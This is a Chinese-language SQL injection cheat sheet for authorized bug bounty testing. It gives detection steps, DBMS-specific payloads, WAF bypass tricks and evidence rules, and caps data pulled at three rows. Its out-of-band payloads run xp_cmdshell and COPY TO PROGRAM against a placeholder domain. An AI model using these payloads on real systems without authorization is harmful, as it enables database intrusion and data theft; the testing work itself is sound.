# SQL 注入 (SQLi) — 决策索引

> 视角: 黑盒,关注注入点发现而非数据提取。证明存在即停,不拖库。
> SRC 红线: 发现注入后最多获取 3 条数据,验证即停,不扩大范围。

---

## 入口信号

| 信号 | 可能性 | 快速验证 |
|------|--------|---------|
| URL 参数 `?id=1` `?page=2` `?cat=5` | ⭐⭐⭐ | `'` → 报错? `1 AND 1=1` vs `1 AND 1=2` |
| 搜索框 / 过滤条件 | ⭐⭐⭐ | 输入 `'` 看是否报错或白屏 |
| JSON body 参数 | ⭐⭐ | `{"id": 1}` → `{"id": "1'"}` → 报错? |
| Header (User-Agent/XFF) | ⭐ | 慢速注入,最后测 |
| Cookie 值 | ⭐ | 同上 |
| 排序参数 `?sort=name` `?order=ASC` | ⭐⭐ | `ORDER BY` 注入,盲注为主 |

---

## 检测流程

```
发现数字/字符串参数
    ↓
Step 1: Error 探测
  `'` → 看响应是否包含 SQL 报错信息
  `"` / `')` / `"))`
  匹配错误模式 → 确定 DBMS (MySQL/MSSQL/PGSQL/Oracle)

Step 2: Boolean 探测
  `1 AND 1=1` vs `1 AND 1=2`
  响应长度/内容不同 → 布尔注入

Step 3: Time 探测
  `1 OR SLEEP(3)` / `1 WAITFOR DELAY '0:0:3'`
  响应延迟 > 2.5s → 时间盲注

Step 4: UNION 探测
  `1 UNION SELECT NULL--` → 逐列增加
  报错消失时 → 确定列数 → 提取数据
```

---

## Payload 速查

| DBMS | 报错 | 时间 | UNION |
|------|------|------|-------|
| MySQL | `' OR 1=1-- ` | `' OR SLEEP(3)--` | `' UNION SELECT 1,2,3--` |
| MSSQL | `'` | `' WAITFOR DELAY '0:0:3'--` | `' UNION SELECT NULL,NULL--` |
| PostgreSQL | `'` | `' OR pg_sleep(3)--` | `' UNION SELECT NULL,NULL--` |
| Oracle | `'` | `' OR dbms_pipe.receive_message(('a'),3)--` | `' UNION SELECT NULL,NULL FROM dual--` |
| SQLite | `'` | `' AND randomblob(100000000)--` | `' UNION SELECT 1,2--` |

---

## OOB 盲注

无回显时用 OOB 通道:

| DBMS | OOB Payload | 通道 |
|------|------------|------|
| MySQL | `LOAD_FILE('\\\\{OOB_DOMAIN}\\file')` | DNS |
| MSSQL | `EXEC xp_cmdshell 'ping {OOB_DOMAIN}'` | DNS |
| PostgreSQL | `COPY (SELECT 1) TO PROGRAM 'ping {OOB_DOMAIN}'` | DNS |
| Oracle | `SELECT UTL_HTTP.request('http://{OOB_DOMAIN}/test') FROM dual` | HTTP |

OOB 域名 → 用 Burp Collaborator 或自建 interactsh

---

## WAF 绕过

| WAF 类型 | 绕过策略 |
|----------|---------|
| CloudFlare | SQL 关键字大小写混写 `SeLeCt` + 注释 `/**/` |
| ModSecurity | 编码变异: URL→Double URL→Unicode |
| AWS WAF | 分块传输 + 参数污染 |
| 自定义 WAF | 换 Content-Type (`application/json`), 换方法 (GET↔POST) |

---

## 证据纪律

```
命中后立即保存:
  ☐ 完整 HTTP 请求/响应包 (evidence/sqli/{timestamp}_request.txt)
  ☐ 注入点 URL + 参数名
  ☐ DBMS 类型 (MySQL/MSSQL/PGSQL/Oracle)
  ☐ 注入类型 (Error/Boolean/Time/UNION/OOB)
  ☐ 最多取 3 条数据验证,不拖库
```

---

## 参考文献

- `skills/sqli-sql-injection/SKILL.md` — 完整 SQLi 方法论
- `references/playbooks/rce/12-deserialization.md` — SQLi→RCE chain
- `references/h1-reports/by-weakness/sqli/` — H1 真实案例
